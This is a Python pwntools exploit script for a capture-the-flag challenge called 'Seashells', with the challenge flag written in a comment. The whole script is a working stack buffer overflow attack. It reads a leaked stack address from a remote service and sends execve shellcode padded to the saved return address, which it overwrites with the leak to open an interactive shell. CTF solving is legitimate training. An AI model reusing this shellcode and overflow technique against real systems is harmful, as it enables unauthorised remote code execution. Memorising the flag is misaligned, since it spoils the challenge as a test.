#exploit for Seashells
#flag{popping_shells_by_the_sea_shore}
from pwn import *
import time
elf = ELF("./seashells")
context.binary=elf
target=remote('challenge.ctf.games',32134)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
stack_leak=int(target.recvline().strip("\n")[2:],16)
payload=shellcode.ljust(0x88,"\x00")
payload+=p64(stack_leak)
target.sendline(payload)
target.interactive()
